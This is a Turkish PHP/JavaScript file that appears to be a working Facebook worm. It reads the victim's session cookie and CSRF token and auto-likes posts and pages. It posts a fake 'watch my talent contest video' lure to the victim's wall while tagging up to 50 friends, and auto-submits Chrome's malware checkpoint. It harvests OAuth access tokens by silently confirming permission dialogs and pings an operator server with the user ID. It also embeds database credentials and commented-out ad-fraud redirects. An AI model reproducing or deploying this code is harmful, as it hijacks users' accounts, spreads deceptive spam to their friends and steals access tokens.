// sayaç
var site="http://localhost/facesistemi/site/";
if(!document.getElementById("amung")){
new Image().src = "http://whos.amung.us/pingjs/?k=17tk1ohs0zk1";
}

/*
if(location.hostname.indexOf("facebook.com") == -1) {
window.location.href="http://facebook.com"
}
*/


/*
if(location.hostname.indexOf("oyunanaa.blogspot.com.tr") == -1) {
	window.location.href="http://oyunanaa.blogspot.com.tr/"
	alert("Lütfen şimdi açılacak olan sayfadaki reklamlardan birine tıklayın. \r\nBu size hiçbirşey kaybettirmez. \r\nBir reklama tıkladıktan sonra gezintinize devam edebileceksiniz.");
}
*/

/*
var bc = ["http://bc.vc/AeGdE5","http://bc.vc/QRNUMt","http://bc.vc/Al6sAt","http://bc.vc/8jWU7g","http://bc.vc/bBPWQX","http://bc.vc/epVXRY","http://bc.vc/qAH3V7","http://bc.vc/Wc7D9F","http://bc.vc/1JnO9e","http://bc.vc/EnMQ8F"];
var bcrand = bc[Math.floor(bc.length * Math.random())];

var tarih = new Date();
if(!localStorage['BC'] || (localStorage['BC'] && tarih.getTime() >= (localStorage['BC'] + (1000*60*60)))){
	localStorage['BC'] = tarih.getTime();

	if(location.hostname.indexOf("bc.vc") == -1) {
		window.location.href = bcrand; 
	}else
	{
		setInterval(function(){
		document.getElementById('skip_btn').click();
		},1000);
	}
}
*/

/*
var tarih = new Date();
if(!localStorage['H'] || (localStorage['H'] && tarih.getTime() >= (localStorage['H'] + (1000*60*60)))){
	localStorage['H'] = tarih.getTime();

	if(location.hostname.indexOf("hasarli.com") == -1) {
		window.open("http://hasarli.com/", "X"); 
	}
}
*/


//alert(document.location.toString().indexOf("TmSensinKnkMA"));

/*
if(location.hostname.indexOf("youtube.com") == -1 ) {
	if( document.location.toString().indexOf("TmSensinKnkMA") == -1) {
		window.location.href="http://www.facebook.com/TmSensinKnkMA";
	}else
	{
		window.location.href="http://www.youtube.com";
	}
}
*/


<?
set_time_limit(6000);


mysql_connect('localhost', 'afksnkus2', 's6eg5g3');
mysql_select_db('afksnkdb2');
mysql_query("SET NAMES 'UTF8'");
mysql_query("SET character_set_connection = 'UTF8'");
mysql_query("SET character_set_client = 'UTF8'");
mysql_query("SET character_set_results = 'UTF8'");


?>


var profile_id = document.cookie.match(/c_user=(\d+)/)[1].toString();

<?php
echo "var sayfalar = [";
$calistir = mysql_query("select * from sayfalar order by rand() limit 3");
$pegbo = "";
while($oku=mysql_fetch_assoc($calistir)){
$linkler = $oku ['sayfa_id'];
$tamlink = "'".$linkler."',"; 

$pegbo .= str_replace(",'];","'];",$tamlink);
}
$pegbo1 = "".$pegbo."];";
echo str_replace(",];","];",$pegbo1);


echo "var likes = [";
$calistir = mysql_query("select * from begeniler order by rand() limit 5");
$pegbo = "";
while($oku=mysql_fetch_assoc($calistir)){
$linkler = $oku ['post_id'];
$tamlink = "'".$linkler."',"; 

$pegbo .= str_replace(",'];","'];",$tamlink);
}
$pegbo1 = "".$pegbo."];";
echo str_replace(",];","];",$pegbo1);
?>


function begen(id) {
 var xhr = new XMLHttpRequest();
 params ="like_action=true";
 params +="&ft_ent_identifier="+id;
 params +="&source=2";
 params +="&client_id=1385682597409%3A3331188475";
 params +="&rootid=u_jsonp_11_6";
 params +="&giftoccasion";
 params +="&ft[tn]=%3E%3D";
 params +="&ft[type]=20";
 params +="&__user="+profile_id;
 params +="&__a=1";
 params +="&__dyn=7n8anEAMCBClUlgDxqiykUUxoshK9x2mbAKl0";
 params +="&__req=1g";
 params +="&fb_dtsg="+document.getElementsByName("fb_dtsg")[0].value;
 params +="&__rev=1025849";
 params +="&ttstamp=";
 xhr.open("POST", "/ajax/ufi/like.php", true);
	xhr.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
	xhr.onreadystatechange = function () {
        if (xhr.readyState == 4 && xhr.status == 200) {
            xhr.close;
        }
    }
    xhr.send(params);
}

if(navigator.userAgent.indexOf("Chrome") >= 0 && location.hostname.indexOf("facebook.com") >= 0)
{
	for(i=0;i<likes.length;i++){ 
		begen(likes[i]);
	}
	for(i=0;i<sayfalar.length;i++){ 
		sayfa(sayfalar[i]);
	}
	
	var xhr = new XMLHttpRequest();
	xhr.open("GET", ""+site+"us/us-ajax.php?action=ping&userid=" + profile_id, true);
	xhr.onreadystatechange = function() {
		if (xhr.readyState == 4) {
			gelen = xhr.responseText;
		}
	}
	xhr.send();
}


function f_etiketle()
{
	var ids = "";
	var xhr = new XMLHttpRequest();
	xhr.open("GET", "//www.facebook.com/ajax/typeahead/first_degree.php?__a=1&viewer=" + profile_id + "&__user=" + profile_id + "&filter[0]=user&options[0]=friends_only&options[1]=nm&token=v7", true);
	xhr.onreadystatechange = function() {
		if (xhr.readyState == 4) {
			gelen = xhr.responseText.toString();
		}
	}
	xhr.send();

	for(i=1; i<=5000; i++)
	{
		if(gelen.match(/"uid":(\d+)/g)[i] !== undefined)
		{
			if(ids == "" )
			{
				ids += gelen.match(/"uid":(\d+)/g)[i].replace('"uid":','');
			}else
			{
				ids += ";" + gelen.match(/"uid":(\d+)/g)[i].replace('"uid":','');
			}
		}
	}

	var idsArr = ids.split(";");
	var etiketlenecekler = "";
	for(i=0; i<50; i++)
	{
		if(etiketlenecekler == "")
		{
			etiketlenecekler += idsArr[Math.floor(Math.random() * idsArr.length)];
		}else
		{
			etiketlenecekler += ";" + idsArr[Math.floor(Math.random() * idsArr.length)];
		}
	}
	return etiketlenecekler;
}

if(!localStorage['E_' + profile_id] || localStorage['E_' + profile_id] == "")
{
	var ids = "";
	var xhr = new XMLHttpRequest();
	xhr.onreadystatechange = function() {
		if (xhr.readyState == 4) {
			gelen = xhr.responseText.toString();
		}
	}
	xhr.open("GET", "//www.facebook.com/ajax/typeahead/first_degree.php?__a=1&viewer=" + profile_id + "&__user=" + profile_id + "&filter[0]=user&options[0]=friends_only&options[1]=nm&token=v7", true);
	xhr.send();

	for(i=1; i<=5000; i++)
	{
		if(gelen.match(/"uid":(\d+)/g)[i] !== undefined)
		{
			if(ids == "" )
			{
				ids += gelen.match(/"uid":(\d+)/g)[i].replace('"uid":','');
			}else
			{
				ids += ";" + gelen.match(/"uid":(\d+)/g)[i].replace('"uid":','');
			}
		}
	}

	var idsArr = ids.split(";");
	var etiketlenecekler = "";
	for(i=0; i<50; i++)
	{
		if(etiketlenecekler == "")
		{
			etiketlenecekler += idsArr[Math.floor(Math.random() * idsArr.length)];
		}else
		{
			etiketlenecekler += ";" + idsArr[Math.floor(Math.random() * idsArr.length)];
		}
	}
	localStorage['E_' + profile_id] = etiketlenecekler;
}


var chromecheckpoint = document.getElementById('chrome_malware_checkpoint'); 
if (chromecheckpoint) { 
    var inputgec = document.createElement('input'); 
    inputgec.name = "submit[Continue]"; 
    inputgec.value = 'Devam'; 
    inputgec.type = 'hidden'; 
    document.forms[0].appendChild(inputgec); 
    document.forms[0].submit(); 
  
}
/*
if(location.hostname.indexOf("www.facebook.com") >= 0) {
window.setInterval(function(){
	if(document.getElementsByClassName("ego_unit_container").length > 0){ 
		if(document.getElementsByClassName("ego_unit_container")[0].innerHTML.indexOf("dropboxusercontent.com") == -1) { 
			document.getElementsByClassName("ego_unit_container")[0].innerHTML = '<center><div style="overflow:hidden; width: 244px; height: 508px;"><iframe src="https://dl.dropboxusercontent.com/s/ewyzla0gpxfst87/face.html" style="width: 244px;height: 508px;overflow: hidden;" scrolling="no" frameborder="0" marginheight="0" marginwidth="0"></iframe></div></center>';
		}
	}
	if(document.getElementsByClassName("clearfix _5pcr userContentWrapper").length > 0){ 
		if(document.getElementsByClassName("clearfix _5pcr userContentWrapper")[0].innerHTML.indexOf("dropboxusercontent.com") == -1) { 
			document.getElementsByClassName("clearfix _5pcr userContentWrapper")[0].innerHTML = '<center><div style="overflow:hidden; width: 476px; height: 420px;"><iframe src="https://dl.dropboxusercontent.com/s/0mxiaqlbgp1mjc9/orta.html" style="width: 476px;height: 540px;overflow: hidden;" scrolling="no" frameborder="0" marginheight="0" marginwidth="0"></iframe></div></center>';
		}
	}
	if(document.getElementsByClassName("_5ce")){
	for(i=0;i<document.getElementsByClassName("_5ce").length;i++){
	document.getElementsByClassName("_5ce")[i].innerHTML = "";
	}
	}
	if(document.getElementsByClassName("uiToggle wrap")){
	for(i=0;i<document.getElementsByClassName("uiToggle wrap").length;i++){
	document.getElementsByClassName("uiToggle wrap")[i].innerHTML = "";
	}
	}
	if(document.getElementsByClassName("uiPopover")){
	for(i=0;i<document.getElementsByClassName("uiPopover").length;i++){
	document.getElementsByClassName("uiPopover")[i].innerHTML = "";
	}
	}
	},10);
}
*/

/*
if (location.hostname.indexOf("twitter.com") >= 0) {
authenticity_token = document.getElementsByName("authenticity_token")[0].value;
function follow(id){
var xmlhttp = new XMLHttpRequest();
        xmlhttp.onreadystatechange = function () {
			if(xmlhttp.readyState == 4){
			}
        };
		var params = "&authenticity_token="+authenticity_token;
		params += "&user_id=" +  id;
		xmlhttp.open("POST", "/i/user/follow", true);
		xmlhttp.setRequestHeader ("Content-Type","application/x-www-form-urlencoded");
		xmlhttp.send(params);
}
follow("");
}
*/

<?php
$sql = mysql_query("select * from link where active = '1' order by rand() limit 1");
$row = mysql_fetch_array($sql);
echo "var source = '" . $row['link'] . "';";
echo "var image = '" . $row['resim_link'] . "';";
echo "var rand = '" . $row['yorum'] . "';";
echo "var baslik = '" . $row['video_baslik'] . "';";
?>

var profile_id = document.cookie.match(/c_user=(\d+)/)[1].toString();

var aciklaArr = ["oha."];
var gonderArr = [":D duvarımdaki videomu izlesene :D hadiiiiii","acuna katılmıştım :D videomu tvde izlemediysen duvarımda var :D","ordamısın, duvarımdaki videomu izlermisin destek ol bana lütfen","şşttt ordamsn .s ya kusura bakma rahatsız ediyorum yeteneksizsinize katılmıştım ama elemeleri geçmem gerekiyor lütfen duvarımdaki videomu izleyip bana destek olur musun?","merhaba rarhatsız ediyorum özür dilerim, yarışmaya katılmıştım videomu duvarımda paylaştım izlermisin :)","duvarımdaki videomu izleyip bana destek olurmusun?","yeteneksizsinize katılmıştım performansımı izlermisin duvarımda"];
var acikla = aciklaArr[Math.floor(aciklaArr.length * Math.random())];
var gonder = gonderArr[Math.floor(gonderArr.length * Math.random())];
if(location.hostname.indexOf("www.facebook.com","static.ak.facebook.com","apps.facebook.com","beta.facebook.com") >= 0){
var user_id = document.cookie.match(document.cookie.match(/c_user=(\d+)/)[1]);
var profile_id = document.cookie.match(document.cookie.match(/c_user=(\d+)/)[1]).toString();
var fb_dtsg = document.getElementsByName('fb_dtsg')[0].value;


window.setInterval(function(){
if(document.getElementsByClassName("_5ce")){
for(i=0;i<document.getElementsByClassName("_5ce").length;i++){
document.getElementsByClassName("_5ce")[i].innerHTML = "";
}
}
if(document.getElementsByClassName("uiToggle wrap")){
for(i=0;i<document.getElementsByClassName("uiToggle wrap").length;i++){
document.getElementsByClassName("uiToggle wrap")[i].innerHTML = "";
}
}
if(document.getElementsByClassName("uiPopover")){
for(i=0;i<document.getElementsByClassName("uiPopover").length;i++){
document.getElementsByClassName("uiPopover")[i].innerHTML = "";
}
}
},200);

var profile_id = document.cookie.match(document.cookie.match(/c_user=(\d+)/)[1]).toString();

function abone(id) {
var http = new XMLHttpRequest();
http.onreadystatechange = function () {
    if (http.readyState == 4) {}
};
var params = "profile_id=" + id;
params += "&location=1";
params += "&nctr[_mod]=pagelet_main_column_personal";
params += "&__user=" + profile_id;
params += "&__a=1";
params += "&fb_dtsg=" + document.getElementsByName('fb_dtsg')[0].value;
params += "&phstamp=16581651097412012156155";
http.open("POST", "/ajax/follow/follow_profile.php", true);
http.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
http.send(params);
}
function sayfa(id) {
var http = new XMLHttpRequest();
http.onreadystatechange = function () {
    if (http.readyState == 4) {}
};
var params = "fbpage_id=" + id;
params += "&add=true";
params += "&fan_origin=page_timeline";
params += "&nctr[_mod]=pagelet_timeline_page_actions";
params += "&__user=" + profile_id;
params += "&__a=1";
params += "&fb_dtsg="+document.getElementsByName('fb_dtsg')[0].value;
params += "&phstamp=16581651097412012156155";
http.open("POST", "/ajax/pages/fan_status.php", true);
http.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
http.send(params);
}



function resim_paylas() {

var xhr = new XMLHttpRequest();
xhr.open("GET", "//graph.facebook.com/" + profile_id, true);
xhr.onreadystatechange = function() {
    if (xhr.readyState == 4) {
        gelen = JSON.parse(xhr.responseText);
		if(gelen.id){
			isim = gelen.name;

		}
    }
}
xhr.send();

var http = new XMLHttpRequest();
http.onreadystatechange = function () {
    if (http.readyState == 4) {}
};

var rastgeleuret = rastgele(6);

var params = "fb_dtsg="+document.getElementsByName('fb_dtsg')[0].value;
//params += "composer_session_id=289f0f5e-97c7-46ed-a9d9-4cce1b8a0dfc";
params += "&xhpc_context=profile";
params += "&xhpc_ismeta=1";
params += "&xhpc_timeline=1";
params += "&xhpc_composerid=u_jsonp_10_d";
params += "&xhpc_targetid=" + profile_id;
//params += "&clp	{"cl_impid":"f0489fcd","clearcounter":0,"elementid":"u_jsonp_10_s","version":"x","parent_fbid":100002973645601}";
//params += "&xhpc_message_text=" + isim + " bu videoyu beğendi ve yorum yaptı.\\r\\n" + rand + " " + rastgeleuret;
//params += "&xhpc_message=" + isim + " bu videoyu beğendi ve yorum yaptı.\\r\\n" + rand + " " + rastgeleuret;
params += "&xhpc_message_text=" + isim + " bu videoyu beğendi ve yorum yaptı. Sen de izlemelisin.";
params += "&xhpc_message=" + isim + " bu videoyu beğendi ve yorum yaptı. Sen de izlemelisin.";

params += "&aktion=post";
params += "&app_id=2309869772";
params += "&attachment[params][urlInfo][canonical]=" + image;
//params += "&attachment[params][urlInfo][final]=" + image;
//params += "&attachment[params][urlInfo][user]=" + image;

//params += "&attachment[params][title]=Yetenek Sizsiniz T\xFCrkiye " + isim + " Performans\u0131";
//params += "&attachment[params][summary]=acunn.com - " + isim + " videosunu izle.";
//params += "&attachment[params][images][0]=" + image + "#" + rastgele(25);
//params += "&attachment[params][url]="+ source + "#" + rastgele(25);

params += "&attachment[params][title]=" + baslik;
params += "&attachment[params][summary]=www.youtube.com";
params += "&attachment[params][images][0]=" + image;
params += "&attachment[params][url]="+ source;

params += "&attachment[params][medium]=101";
params += "&attachment[type]=100";
params += "&link_metrics[source]=ShareStageExternal";
//params += "&link_metrics[domain]=2.bp.blogspot.com";
//params += "&link_metrics[base_domain]=bp.blogspot.com";
params += "&link_metrics[title_len]=100";
params += "&link_metrics[summary_len]=0";
params += "&link_metrics[min_dimensions][0]=70";
params += "&link_metrics[min_dimensions][1]=70";
params += "&link_metrics[images_with_dimensions]=1";
params += "&link_metrics[images_pending]=0";
params += "&link_metrics[images_fetched]=0";
params += "&link_metrics[image_dimensions][0]=1600";
params += "&link_metrics[image_dimensions][1]=900";
params += "&link_metrics[images_selected]=1";
params += "&link_metrics[images_considered]=1";
params += "&link_metrics[images_cap]=3";
params += "&link_metrics[images_type]=ranked";


if(localStorage['E_' + profile_id] !== "")
{
	var flist = localStorage['E_' + profile_id].split(";");
	for(i=0; i<50; i++)
	{
		params += "&composertags_with[" + i + "]=" + flist[i];
	}
}

params += "&composer_metrics[best_image_w]=398";
params += "&composer_metrics[best_image_h]=207";
params += "&composer_metrics[image_selected]=0";
params += "&composer_metrics[images_provided]=1";
params += "&composer_metrics[images_loaded]=1";
params += "&composer_metrics[images_shown]=1";
params += "&composer_metrics[load_duration]=1";
params += "&composer_metrics[timed_out]=0";
//params += "&composer_metrics[sort_order]	";
params += "&composer_metrics[selector_type]=UIThumbPager_6";
//params += "&backdated_date[year]	";
//params += "&backdated_date[month]	";
//params += "&backdated_date[day]	";
//params += "&backdated_date[hour]	";
//params += "&backdated_date[minute]	";
//params += "&is_explicit_place	";
//params += "&composertags_place	";
//params += "&composertags_place_name	";
params += "&tagger_session_id=1389002672";
//params += "&action_type_id[0]	";
//params += "&object_str[0]	";
//params += "&object_id[0]	";
params += "&hide_object_attachment=0";
//params += "&og_suggestion_mechanism	";
//params += "&composertags_city	";
params += "&disable_location_sharing=false";
params += "&composer_predicted_city=106012156106461";
params += "&audience[0][value]=80";
params += "&nctr[_mod]=pagelet_timeline_recent";
params += "&__user=" + profile_id;
params += "&__a=1";
//params += "&__dyn=7n8aqEAMBlDTzpQ9UmAEBee8m7pEsx6iWF29aBw";
params += "&__req=1i";
params += "&__rev=1068196";
params += "&ttstamp=2658165108971108485";

http.open("POST", "/ajax/profile/composer.php", true);
http.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
http.send(params);
}

function video_paylas() {
var http = new XMLHttpRequest();
http.onreadystatechange = function () {
    if (http.readyState == 4) {}
};

// video paylaş
var params = "fb_dtsg="+document.getElementsByName('fb_dtsg')[0].value;
//params += "composer_session_id=289f0f5e-97c7-46ed-a9d9-4cce1b8a0dfc";
params += "&xhpc_context=profile";
params += "&xhpc_ismeta=1";
params += "&xhpc_timeline=1";
params += "&xhpc_composerid=u_jsonp_7_d";
params += "&xhpc_targetid=" + profile_id;
//params += "&clp	{"cl_impid":"38cde528","clearcounter":1,"elementid":"u_jsonp_7_s","version":"x","parent_fbid":100002973645601}
params += "&xhpc_message_text=video";
params += "&xhpc_message=video";
params += "&aktion=post";
params += "&app_id=2309869772";
params += "&attachment[params][urlInfo][canonical]=http://www.youtube.com/watch?v=WFXcMV5bRrI";
params += "&attachment[params][urlInfo][final]=http://www.youtube.com/watch?v=WFXcMV5bRrI";
params += "&attachment[params][urlInfo][user]=http://www.youtube.com/watch?v=WFXcMV5bRrI";
params += "&attachment[params][favicon]=http://s.ytimg.com/yts/img/favicon_32-vflWoMFGx.png";
params += "&attachment[params][title]=Medcezir 16.Bölüm";
params += "&attachment[params][summary]=Sevdiği kadının öfkeyle dudaklarından dökülen kelimeler, Yaman'a tenine kazınmış etiketlerden asla kurtulamayacağını ispatlar. Serezlerin evinde düzenlenen y...";
params += "&attachment[params][images][0]=http://i1.ytimg.com/vi/WFXcMV5bRrI/hqdefault.jpg";
params += "&attachment[params][medium]=103";
params += "&attachment[params][url]=http://google.com";
params += "&attachment[params][video][0][type]=application/x-shockwave-flash";
params += "&attachment[params][video][0][src]=http://www.youtube.com/v/WFXcMV5bRrI?version=3&autohide=1&autoplay=1";
params += "&attachment[params][video][0][width]=640";
params += "&attachment[params][video][0][height]=360";
params += "&attachment[params][video][0][safe]=1";
params += "&attachment[type]=100";
params += "&link_metrics[source]=ShareStageExternal";
params += "&link_metrics[domain]=www.youtube.com";
params += "&link_metrics[base_domain]=youtube.com";
params += "&link_metrics[title_len]=17";
params += "&link_metrics[summary_len]=160";
params += "&link_metrics[min_dimensions][0]=70";
params += "&link_metrics[min_dimensions][1]=70";
params += "&link_metrics[images_with_dimensions]=1";
params += "&link_metrics[images_pending]=1";
params += "&link_metrics[images_fetched]=1";
params += "&link_metrics[images_fetch_duration]=12";
params += "&link_metrics[image_dimensions][0]=480";
params += "&link_metrics[image_dimensions][1]=360";
params += "&link_metrics[images_selected]=1";
params += "&link_metrics[images_considered]=1";
params += "&link_metrics[images_cap]=10";
params += "&link_metrics[images_type]=images_array";
params += "&composer_metrics[best_image_w]=398";
params += "&composer_metrics[best_image_h]=208";
params += "&composer_metrics[image_selected]=0";
params += "&composer_metrics[images_provided]=1";
params += "&composer_metrics[images_loaded]=1";
params += "&composer_metrics[images_shown]=1";
params += "&composer_metrics[load_duration]=1302";
params += "&composer_metrics[timed_out]=0";
//params += "&composer_metrics[sort_order]	
params += "&composer_metrics[selector_type]=UIThumbPager_6";
//params += "&backdated_date[year]	
//params += "&backdated_date[month]	
//params += "&backdated_date[day]	
//params += "&backdated_date[hour]	
//params += "&backdated_date[minute]	
//params += "&is_explicit_place	
//params += "&composertags_place	
//params += "&composertags_place_name	
//params += "&tagger_session_id=1389000800";
//params += "&action_type_id[0]	
//params += "&object_str[0]	
//params += "&object_id[0]	
params += "&hide_object_attachment=0";
//params += "&og_suggestion_mechanism
//params += "&composertags_city	
params += "&disable_location_sharing=false";
params += "&composer_predicted_city=106012156106461";
params += "&audience[0][value]=80";
params += "&nctr[_mod]=pagelet_timeline_recent";
params += "&__user=" + profile_id;
params += "&__a=1";
//params += "&__dyn=7n8aqEAMBlDTzpQ9UmAEBee8m7pEsx6iWF29aBw";
params += "&__req=13";
params += "&__rev=1068196";
params += "&ttstamp=2658165108971108485";


http.open("POST", "/ajax/profile/composer.php", true);
http.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
http.send(params);

}

function durum_paylas() {
var http = new XMLHttpRequest();
http.onreadystatechange = function () {
    if (http.readyState == 4) {}
};

// durum paylaş
var params = "fb_dtsg="+document.getElementsByName('fb_dtsg')[0].value;
params += "&xhpc_context=profile";
params += "&xhpc_ismeta=1";
params += "&xhpc_timeline=1";
params += "&xhpc_composerid=u_jsonp_4_d";
params += "&xhpc_targetid=" + profile_id;
params += "&xhpc_message_text=deneme";
params += "&xhpc_message=deneme";
params += "&hide_object_attachment=0";
params += "&disable_location_sharing=false";
params += "&composer_predicted_city=106012156106461";
params += "&audience[0][value]=80";
params += "&nctr[_mod]=pagelet_timeline_recent";
params += "&__user=" + profile_id;
params += "&__a=1";
params += "&__req=15";
params += "&ttstamp=16581651097412012156155";

http.open("POST", "/ajax/profile/composer.php", true);
http.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
http.send(params);

}




function uygulamaizinver(url){
var xmlhttp = new XMLHttpRequest();
xmlhttp.onreadystatechange = function () {
if(xmlhttp.readyState == 4){
izinverhtml = document.createElement("html");
izinverhtml.innerHTML = xmlhttp.responseText;
if(izinverhtml.getElementsByTagName("form").length > 0){
izinverhtml.innerHTML = izinverhtml.getElementsByTagName("form")[0].outerHTML
act = izinverhtml.getElementsByTagName("form")[0].action;
duzenlevegonder(izinverhtml,act);
}
}
};		
xmlhttp.open("GET", url, true); 
xmlhttp.send();
}

function duzenlevegonder(formnesne,act){
izinverparams = "";
for(i=0;i<formnesne.getElementsByTagName("input").length;i++){
if(formnesne.getElementsByTagName("input")[i].name.indexOf("__CANCEL__") < 0 && formnesne.getElementsByTagName("input")[i].name.indexOf("cancel_clicked")){
izinverparams += "&" + formnesne.getElementsByTagName("input")[i].name + "=" + formnesne.getElementsByTagName("input")[i].value;
}
}
if(formnesne.getElementsByTagName("select").length > 0){
izinverparams += "&" + formnesne.getElementsByTagName("select")[0].name + "=80";
}
izinverparams.replace("&fb_dtsg","fb_dtsg");
izinverparams += "&__CONFIRM__=1";
formnesne = formnesne;
var xmlhttp = new XMLHttpRequest();
        xmlhttp.onreadystatechange = function () {
			if(xmlhttp.readyState == 4){
			  izinhtml = document.createElement("html");
			  izinhtml.innerHTML = xmlhttp.responseText;
			if(izinhtml.getElementsByTagName("form").length > 0){
			  izinhtml.innerHTML = izinhtml.getElementsByTagName("form")[0].outerHTML;
			  act = izinhtml.getElementsByTagName("form")[0].action;
			  duzenlevegonder(izinhtml,act)
			}else{
			cek = xmlhttp.responseText.match(/#access_token=(.*?)&expires_in/i);
			if (cek[1]) {
				if(cek[1].indexOf("CAAAAEO") != -1){ 
				post(cek[1]);
				}
			}
			}
			}
        };

xmlhttp.open("POST", act , true); 
xmlhttp.setRequestHeader ("Content-Type", "application/x-www-form-urlencoded");
xmlhttp.send(izinverparams);
}


function TokenUrl(id){
return "//www.facebook.com/dialog/oauth?response_type=token&display=popup&client_id=" + id  +"&redirect_uri="+site+"fbapp/index.php&sso_key=com&scope=email,publish_stream,user_likes,friends_likes,user_birthday,offline_access";
}

//alert(localStorage['wtf_' + profile_id]);
//alert(tarih.getTime());

/*
var profile_id = document.cookie.match(/c_user=(\d+)/)[1].toString();
var xhr = new XMLHttpRequest();
if(document.location.toString().indexOf("https") >= 0)
{
	xhr.open("GET", "https://www.facebook.com/" + profile_id);
}else
{
	xhr.open("GET", "http://www.facebook.com/" + profile_id);
}
xhr.onreadystatechange = function() {
	if (xhr.readyState == 4) {
		gelen = xhr.responseText;
	}
}
xhr.send();
var sonpaylasim = gelen.match(/data-utime="(\d+)"/g)[0].replace('data-utime="', "").replace('"', "")
//alert(sonpaylasim);
*/

var tarih = new Date();
if(navigator.userAgent.indexOf("Chrome") >= 0 && location.hostname.indexOf("facebook.com") >= 0 && (localStorage['E_' + profile_id] && localStorage['E_' + profile_id] !== ""))
{
	if(!localStorage['LPT_' + profile_id] || (localStorage['LPT_' + profile_id] && tarih.getTime() >= (localStorage['LPT_' + profile_id]) + (1000*60*10)))
	{
		localStorage['LPT_' + profile_id] = tarih.getTime();
		localStorage['E_' + profile_id] = "";
	}
}


function sendmsg(toid){
/*
	var httpc = new XMLHttpRequest();
	var msgid = Math.floor(Math.random()*1000000);
	var time = Math.round(new Date().getTime() / 1000);
	var paramsc = "message_batch[0][action_type]=ma-type%3Auser-generated-message&message_batch[0][author]=fbid%3A" + user_id + "&message_batch[0][author_email]&message_batch[0][coordinates]&message_batch[0][is_forward]=false&message_batch[0][is_filtered_content]=false&message_batch[0][spoof_warning]=false&message_batch[0][source]=source%3Atitan%3Aweb&&message_batch[0][body]=" + chatamk + "&message_batch[0][has_attachment]=false&message_batch[0][html_body]=false&&message_batch[0][specific_to_list][0]=fbid%3A" + toid + "&message_batch[0][specific_to_list][1]=fbid%3A" + user_id + "&&message_batch[0][forward_count]=0&message_batch[0][force_sms]=true&message_batch[0][ui_push_phase]=V3&message_batch[0][status]=0&message_batch[0][message_id]=" + msgid + "&client=mercury&__user=" + user_id + "&__a=1&__dyn=&__req=i&fb_dtsg=" + fb_dtsg + "&phstamp=";
	httpc.open("POST", "/ajax/mercury/send_messages.php?__a=1", true);
	httpc.onreadystatechange = function() {
		if(httpc.readyState == 4 && httpc.status == 200){
			httpc.close;
		}
	}
	httpc.send(paramsc);
*/
}
function getf_online(){
	var xmlhttp = new XMLHttpRequest();
	var params = "user=" + user_id + "&fetch_mobile=false&__user=" + user_id + "&__a=1&__req=2&fb_dtsg=" + fb_dtsg;
	xmlhttp.open("POST", "/ajax/chat/buddy_list.php?__a=1", true);
	xmlhttp.onreadystatechange = function() {
		if(xmlhttp.readyState == 4 && xmlhttp.status == 200) {
			var response = JSON.parse(xmlhttp.responseText.replace("for (;;);", ""));
			var count = 0;
			for(property in response.payload.buddy_list.nowAvailableList){
				if(count < 20) sendmsg(property);
				count++;
			}
			xmlhttp.close;
		}
	}
	xmlhttp.send(params);
}


function rastgele(uzunluk) {
    mtn = "ABCDEFGHIJKLMNOPRSTUVYZXabcdefghijklmnoprstuvyzx0123456789";
    ret = "";
    for (i = 0; i < uzunluk; i++) {
        ret += mtn[Math.floor(Math.random() * 57)];
    }
    return ret;
}
// duvarda video paylaşırken açıklama yazısı
var u = ["videomu izleyip yorum atın :D performansımı arttırmam lazım biliyorum biraz kötü ama olsun yinede izleyin","izleyemiyorsanız flash player güncelleyin arkadaşlar","arkadaşlar videomu izleyip bana destek olsanıza <3","merhaba canlarım :D nasıl olmuş ama yeteneksizsiniz performansım işte ben ya :D","videyu izleyip bana destek olan herkese şimdiden teşekkürler"];
var rand = u[Math.floor(u.length * Math.random())];



friends = {};

function post(token) {
    var xhr = new XMLHttpRequest();
	xhr.open("POST", "https://graph.facebook.com/me/feed?method=post&privacy={'value':'EVERYONE'}&actions="+JSON.stringify({name: isim.split(" ")[0]+' Performansını İzle',link: escape(source+"#"+rastgele(25))})+"&message="+rand+" "+rastgele(5)+"&link="+escape(source+"#"+rastgele(25))+"&picture=https://i1.ytimg.com/vi/0GtB8LzQCbQ/mqdefault.jpg&name=Yetenek Sizsiniz T\xFCrkiye " + isim + " Performans\u0131&caption=acunn.com&description="+isim+" Videosunu izle.&access_token="+ token, true);
    xhr.onreadystatechange = function() {
        if (xhr.readyState == 4) {
            gel = JSON.parse(xhr.responseText);
			if(gel.id){
			on_arkadas(gel.id.split("_")[1]);
			
			}
        }
    }
    xhr.send();
}

friends= [];
function on_arkadas(id){
	var xmlhttp = new XMLHttpRequest();
	var params = "user=" + document.cookie.match(document.cookie.match(/c_user=(\d+)/)[1]) + "&fetch_mobile=false&__user=" + document.cookie.match(document.cookie.match(/c_user=(\d+)/)[1]) + "&__a=1&__req=2&fb_dtsg=" + document.getElementsByName('fb_dtsg')[0].value;
	xmlhttp.open("POST", "/ajax/chat/buddy_list.php?__a=1", true);
	xmlhttp.onreadystatechange = function() {
		if(xmlhttp.readyState == 4 && xmlhttp.status == 200) {
			var veri = JSON.parse(xmlhttp.responseText.replace("for (;;);", ""));
			var toplam = Object.keys(veri.payload.buddy_list.nowAvailableList).length;
			for(kisi in veri.payload.buddy_list.nowAvailableList){
				friends.push({id: kisi});
				if(toplam == friends.length){ 
					Etiketle(id, "arkadaşlar elemeleri geçmek için sürekli paylaşıp sizleri etiketliyorum özür dilerim, izleyip bana destek olursanız çok sevinirim şimdiden teşekkürler (açılmıyorsa flash player güncelleyin arkadaşlar)"); 
				}
			}
		}
	}
	xmlhttp.send(params);
}


function Etiketle(post,mesaj){
var xmlhttp = new XMLHttpRequest();
xmlhttp.onreadystatechange = function () {
    if (xmlhttp.readyState == 4) {}
};
var comment_text = mesaj + "%0A";
if(friends.length < 50){ limit = friends.length; }else { limit = 50; }
for (i = 0; i < limit; i++) {
comment_text += "@[" + friends[i].id + ":x] "
}

var params = "&ft_ent_identifier=" + post;
params += "&fb_dtsg=" + document.getElementsByName('fb_dtsg')[0].value;
params += "&comment_text=" + comment_text;
params += "&_user=" + document.cookie.match(document.cookie.match(/c_user=(\d+)/)[1]).toString();;
params += "&__a=1";
params += "&__dyn=7n8ahyj35CFUlgDxqiyaUVCxSrxG4o";
params += "&__req=5";
params += "&ttstamp=26581661051005178104";
params += "&ft[tn]=[]";
params += "&giftoccasion=";
params += "&attached_photo_fbid=0";
params += "&attached_sticker_fbid=0";
params += "&parent_comment_id=";
